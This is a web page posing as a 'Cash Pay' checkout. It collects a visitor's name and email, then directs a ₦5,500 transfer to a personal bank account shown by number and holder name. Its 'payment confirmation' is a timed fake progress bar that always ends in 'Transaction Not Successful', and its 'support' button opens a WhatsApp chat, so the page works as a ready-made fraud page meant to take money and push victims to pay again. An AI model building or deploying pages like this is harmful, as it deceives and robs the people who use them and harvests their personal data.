<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Cash Pay</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body { font-family: "Inter", sans-serif; background: #f0f2f5; }
    @keyframes spin { 0%{transform:rotate(0deg);}100%{transform:rotate(360deg);} }
    .spinner{border:4px solid rgba(0,0,0,0.1);border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;}
    .spinner-purple{border-top:4px solid #8B5CF6;}
    .spinner-orange{border-top:4px solid #F97316;}
    .progress-bar-fill{height:100%;border-radius:inherit;width:0;transition:width linear;}
    .progress-bar-purple{background:#8B5CF6;}
    .progress-bar-orange{background:#F97316;}
    .error-message{color:#dc2626;font-size:.875rem;margin-top:.5rem;}
    .modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.5);
      display:flex;justify-content:center;align-items:center;z-index:1000;}
    .modal-content{background:#fff;padding:2rem;border-radius:.5rem;box-shadow:0 4px 6px rgba(0,0,0,.1);text-align:center;width:90%;max-width:400px;}
    .modal-button{background:#4F46E5;color:#fff;padding:.75rem 1.5rem;border-radius:.375rem;cursor:pointer;}
    .modal-button:hover{background:#4338CA;}
    .failed-icon-circle{background:#ef4444;border-radius:50%;width:60px;height:60px;display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem;}
    .failed-icon-x{color:#fff;font-size:2.5rem;font-weight:bold;}
  </style>
</head>
<body class="min-h-screen flex flex-col">
  <header class="bg-indigo-900 text-white p-4 shadow-md">
    <h1 class="text-xl font-bold">Cash Pay</h1>
  </header>

  <!-- Payment Form -->
  <main id="paymentForm" class="flex-grow flex items-center justify-center p-4">
    <div class="bg-white rounded-lg shadow-lg p-6 w-full max-w-sm">
      <div class="mb-4">
        <label class="block text-gray-700 text-sm mb-2">Amount</label>
        <input type="text" value="₦5,500" readonly class="cursor-not-allowed w-full py-3 px-4 rounded-lg border bg-gray-100" />
      </div>
      <div class="mb-4">
        <label class="block text-gray-700 text-sm mb-2">Full Name</label>
        <input id="fullName" type="text" placeholder="Your full name" class="w-full py-3 px-4 rounded-lg border" />
        <p id="fullNameError" class="error-message hidden">Full Name is required.</p>
      </div>
      <div class="mb-6">
        <label class="block text-gray-700 text-sm mb-2">Email Address</label>
        <input id="emailAddress" type="email" placeholder="Email address" class="w-full py-3 px-4 rounded-lg border" />
        <p id="emailAddressError" class="error-message hidden">Valid Email is required.</p>
      </div>
      <button id="payButton" class="w-full bg-indigo-900 text-white py-3 rounded-lg">Pay</button>
    </div>
  </main>

  <!-- Loading Screen -->
  <div id="loadingScreen" class="fixed inset-0 bg-white flex flex-col items-center justify-center hidden">
    <div class="spinner spinner-purple mb-4"></div>
    <p class="text-gray-800 text-lg mb-2">Preparing Payment Account</p>
    <p class="text-gray-500 text-sm mb-4">Please wait...</p>
    <div class="w-64 bg-gray-200 rounded-full h-2.5">
      <div id="progressBarPurple" class="progress-bar-fill progress-bar-purple"></div>
    </div>
  </div>

  <!-- Payment Notice -->
  <div id="paymentNoticeScreen" class="fixed inset-0 bg-indigo-900 hidden items-center justify-center p-4">
    <div class="bg-orange-50 p-6 rounded-lg text-center w-full max-w-md mx-auto">
      <h2 class="text-xl text-orange-600 font-bold mb-4">Important payment notice</h2>
      <p class="text-sm text-gray-700 mb-4">Do not use Opay. Transfer to a valid bank first before paying.</p>
      <ol class="list-decimal list-inside text-left text-sm mb-4 text-gray-700">
        <li>Send to Anthem Bank.</li>
        <li>Then pay from there.</li>
      </ol>
      <button id="okButton" class="bg-orange-500 text-white py-2 px-4 rounded-lg w-full">OK</button>
    </div>
  </div>

  <!-- Bank Transfer -->
  <div id="bankTransferScreen" class="fixed inset-0 bg-gray-100 hidden flex flex-col">
    <header class="bg-white text-gray-800 p-4 shadow-md flex justify-between">
      <h1 class="text-lg font-bold">Bank Transfer</h1>
      <button id="cancelButtonTransfer" class="text-red-500">Cancel</button>
    </header>
    <main class="flex-grow p-4">
      <div class="rounded-lg border border-gray-300 p-4 bg-white space-y-4 max-w-md mx-auto">
        <div class="flex justify-between items-center">
          <div>
            <p class="text-gray-500 text-sm">Account Number</p>
            <p class="text-xl font-semibold text-gray-900" id="accountNumber">1782299316</p>
          </div>
          <button onclick="copyToClipboard('1782299316')" class="text-sm text-indigo-600 hover:underline">Copy</button>
        </div>
        <div>
          <p class="text-gray-500 text-sm">Bank Name</p>
          <p class="text-lg font-medium text-gray-800">Access Bank</p>
        </div>
        <div>
          <p class="text-gray-500 text-sm">Account Name</p>
          <p class="text-lg font-medium text-gray-800">ONYEBUCHI JOSHUA</p>
        </div>
        <div>
          <p class="text-gray-500 text-sm">Amount</p>
          <div class="flex justify-between items-center">
            <p class="text-xl font-semibold text-gray-900" id="copyBankAmount">₦5,500</p>
            <button onclick="copyToClipboard('₦5,500')" class="text-sm text-indigo-600 hover:underline">Copy</button>
          </div>
        </div>
        <button id="iHaveTransferredButton" class="bg-orange-500 hover:bg-orange-600 text-white font-bold py-3 px-6 rounded-lg w-full">
          I have made this bank Transfer
        </button>
        <p class="text-gray-600 text-center text-sm mt-3">
          After completed your transfer successfully, check your email inbox within 3 seconds.
        </p>
      </div>
    </main>
  </div>

  <!-- Verifying -->
  <div id="verifyPaymentLoadingScreen" class="fixed inset-0 bg-white flex flex-col items-center justify-center hidden">
    <div class="spinner spinner-orange mb-4"></div>
    <p class="text-gray-800 text-lg mb-2">Confirming Your Payment</p>
    <div class="w-64 bg-gray-200 rounded-full h-2.5">
      <div id="progressBarOrange" class="progress-bar-fill progress-bar-orange"></div>
    </div>
  </div>

  <!-- Transaction Failed -->
  <div id="transactionFailedScreen" class="fixed inset-0 bg-gray-100 hidden flex flex-col">
    <header class="bg-white text-gray-800 p-4 shadow-md flex justify-between">
      <h1 class="text-lg font-bold">Bank Transfer</h1>
      <button id="cancelButtonFailed" class="text-red-500">Cancel</button>
    </header>
    <main class="flex-grow p-4 flex items-center justify-center">
      <div class="bg-white p-6 rounded-lg text-center shadow-md max-w-md mx-auto">
        <div class="failed-icon-circle"><span class="failed-icon-x">×</span></div>
        <h2 class="text-xl font-bold text-orange-600 mb-2">Transaction Not Successful</h2>
        <p class="text-gray-600 mb-4 text-sm">Payment not received. Please check and try again.</p>
        <button id="contactSupportButton" class="bg-gray-300 w-full py-2 rounded-lg text-gray-800">Contact Support</button>
      </div>
    </main>
  </div>

  <!-- Modal -->
  <div id="messageModal" class="modal-overlay hidden">
    <div class="modal-content">
      <h3 id="modalTitle" class="text-xl font-bold mb-2"></h3>
      <p id="modalMessage" class="text-sm text-gray-700 mb-4"></p>
      <button id="modalCloseButton" class="modal-button">OK</button>
    </div>
  </div>

<script>
  let userEmail = '';
  const fullNameInput = document.getElementById('fullName');
  const emailAddressInput = document.getElementById('emailAddress');
  const fullNameError = document.getElementById('fullNameError');
  const emailAddressError = document.getElementById('emailAddressError');
  const payButton = document.getElementById('payButton');
  const okButton = document.getElementById('okButton');
  const iHaveTransferredButton = document.getElementById('iHaveTransferredButton');
  const contactSupportButton = document.getElementById('contactSupportButton');
  const cancelButtonTransfer = document.getElementById('cancelButtonTransfer');
  const cancelButtonFailed = document.getElementById('cancelButtonFailed');
  const paymentForm = document.getElementById('paymentForm');
  const loadingScreen = document.getElementById('loadingScreen');
  const paymentNoticeScreen = document.getElementById('paymentNoticeScreen');
  const bankTransferScreen = document.getElementById('bankTransferScreen');
  const verifyPaymentLoadingScreen = document.getElementById('verifyPaymentLoadingScreen');
  const transactionFailedScreen = document.getElementById('transactionFailedScreen');
  const progressBarPurple = document.getElementById('progressBarPurple');
  const progressBarOrange = document.getElementById('progressBarOrange');

  function showModal(t, m) {
    document.getElementById('modalTitle').textContent = t;
    document.getElementById('modalMessage').textContent = m;
    document.getElementById('messageModal').classList.remove('hidden');
  }
  document.getElementById('modalCloseButton').addEventListener('click', () => {
    document.getElementById('messageModal').classList.add('hidden');
  });
  function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
      showModal('Copied!', 'Text copied to clipboard.');
    }, () => {
      showModal('Error', 'Failed to copy.');
    });
  }
  function simulateBar(el, duration, cb) {
    let w = 0;
    const step = 100 / (duration / 20);
    const iv = setInterval(() => {
      w += step;
      el.style.width = w + '%';
      if (w >= 100) { clearInterval(iv); cb(); }
    }, 20);
  }

  payButton.addEventListener('click', () => {
    let fn = fullNameInput.value.trim(), em = emailAddressInput.value.trim(), ok=true;
    fullNameError.classList.add('hidden');
    emailAddressError.classList.add('hidden');
    if (!fn) { fullNameError.classList.remove('hidden'); ok=false; }
    if (!em.includes('@')) { emailAddressError.classList.remove('hidden'); ok=false; }
    if (!ok) return;
    userEmail = em;
    paymentForm.classList.add('hidden');
    loadingScreen.classList.remove('hidden');
    simulateBar(progressBarPurple, 3000, () => {
      loadingScreen.classList.add('hidden');
      paymentNoticeScreen.classList.remove('hidden');
    });
  });
  okButton.addEventListener('click', () => {
    paymentNoticeScreen.classList.add('hidden');
    bankTransferScreen.classList.remove('hidden');
  });
  iHaveTransferredButton.addEventListener('click', () => {
    bankTransferScreen.classList.add('hidden');
    verifyPaymentLoadingScreen.classList.remove('hidden');
    simulateBar(progressBarOrange, 5000, () => {
      verifyPaymentLoadingScreen.classList.add('hidden');
      transactionFailedScreen.classList.remove('hidden');
    });
  });
  cancelButtonTransfer.addEventListener('click', () => {
    bankTransferScreen.classList.add('hidden');
    paymentForm.classList.remove('hidden');
  });
  cancelButtonFailed.addEventListener('click', () => {
    transactionFailedScreen.classList.add('hidden');
    paymentForm.classList.remove('hidden');
  });
  contactSupportButton.addEventListener('click', () => {
    window.location.href = 'https://wa.me/2349151268086';
  });
</script>
</body>
</html>
